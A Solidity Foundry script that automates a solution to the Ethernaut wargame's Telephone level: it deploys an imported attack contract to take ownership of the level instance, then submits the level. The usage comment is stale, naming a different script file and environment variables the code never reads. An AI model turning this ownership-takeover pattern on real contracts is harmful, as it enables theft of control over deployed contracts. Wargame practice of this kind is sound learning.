// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "interfaces/IEthernaut.sol";
import { Telephone } from "src/Level04.sol";
import { L04Attack } from "src/Level04Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
    Telephone instance;
    L04Attack attack;

    // Run with `INSTANCE_ADDRESS=0x... ATTACK_ADDRESS=0x... forge script --broadcast script/Level03.sol:Attack` 10
    // times
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        instance = Telephone(instanceAddress);
        attack = new L04Attack(instance);

        attack.attack();
        console2.log(instance.owner());

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
